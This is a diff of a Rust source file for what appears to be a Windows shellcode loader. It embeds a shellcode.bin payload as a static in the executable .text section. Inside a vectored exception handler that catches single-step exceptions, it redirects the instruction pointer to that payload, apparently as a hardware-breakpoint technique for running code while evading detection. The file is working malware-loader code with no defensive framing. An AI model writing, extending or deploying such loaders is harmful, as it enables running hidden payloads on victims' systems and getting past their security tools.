@@ -1,7 +1,7 @@
-use std::{mem::zeroed, os::raw::c_void, ptr::null_mut, thread};
+use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};
 
 use windows_sys::Win32::{
-    Foundation::{CI_E_CONFIG_DISK_FULL, EXCEPTION_SINGLE_STEP},
+    Foundation::EXCEPTION_SINGLE_STEP,
     System::{
         Diagnostics::Debug::{
             AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
@@ -13,7 +13,12 @@ use windows_sys::Win32::{
     },
 };
 
-const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
+const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
+const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();
+
+#[unsafe(no_mangle)]
+#[unsafe(link_section = ".text")]
+static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");
 
 static mut SLEEP_FUNC_ADDR: *mut c_void = null_mut();
 
@@ -84,6 +89,8 @@ unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINT
                 println!("RDX: {:x}", (*(*exception_info).ContextRecord).Rdx);
                 println!("R8: {:x}", (*(*exception_info).ContextRecord).R8);
                 println!("R9: {:x}", (*(*exception_info).ContextRecord).R9);
+
+                (*(*exception_info).ContextRecord).Rip = SHELLCODE.as_ptr() as u64;
 
                 (*(*exception_info).ContextRecord).EFlags |= 0x10000;
 
